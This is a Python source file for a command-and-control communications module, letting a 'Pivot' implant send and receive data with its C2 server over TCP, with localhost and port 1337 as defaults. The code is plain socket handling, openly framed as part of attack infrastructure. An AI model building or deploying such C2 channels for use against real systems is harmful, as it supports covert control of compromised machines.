#!/usr/bin/python

"""
A communications module that allows a Pivot to communicate with its
command and control server via a TCP connection. The C2 server is
assumed to be up and listening for a connection.

>>> test_bytes = b'transmission'
>>> server_address = '127.0.0.1'
>>> server_port = 5001
>>> BUF_SIZE = 1024
>>> server = socket(AF_INET, SOCK_STREAM, 0)
>>> server.bind((server_address, server_port))
>>> server.listen(1)
>>> TCPcomm = TCPcommunicator(server_address, server_port)
>>> (connection, address) = server.accept()
>>> TCPcomm.send(test_bytes)
>>> data = connection.recv(BUF_SIZE)
>>> print(data)
b'transmission'
>>> TCPcomm.close()
>>> connection.close()
>>> server.close()

"""

from socket import *


class TCPcommunicator:

    # Buffer size to use when receiving from
    # the C2 server
    __BUFFER_SIZE = 1024

    # IP address of the C2 server, default is localhost
    # for testing purposes
    __c2_ip = '127.0.0.1'

    # Listening port of the c2 server, default port
    # is 1337
    __c2_port = 1337

    # Socket that will be bound to the C2 server
    __sock = socket(AF_INET, SOCK_STREAM, 0)
    # Stop the socket from blocking if C2 server is not
    # sending any data
    __sock.settimeout(3.0)

    def __init__(self, address, port):
        """
            Initialises the communicator with the
            specified C2 server address and port.
        """

        self.__c2_ip = address
        self.__c2_port = port

        # Bind to the C2 server's listening socket
        try:
            self.__sock.connect((self.__c2_ip, self.__c2_port))

        except InterruptedError as e:
            print("Error connecting client socket")

    def send(self, buffer):
        """
            Sends a stream of bytes to the C2 server. The stream of
            bytes is contained within the specified buffer.
        """

        self.__sock.send(buffer)

    def receive(self):
        """
            Reads a stream of data received from the C2 server. Will
            continue to read and fill a buffer until the C2 server
            stops transmitting.
        """

        # List in which to accumulate received bytes
        data = []

        while True:

            # Stop listening if nothing received from
            # C2 server
            try:
                buffer = self.__sock.recv(self.__BUFFER_SIZE)
                data.append(buffer)

            except timeout as err:
                break

        return b''.join(data)

    def close(self):
        """
            Closes the connection with the C2 server
        """

        self.__sock.close()

    if __name__ == "__main__":
        import doctest

        doctest.testmod()
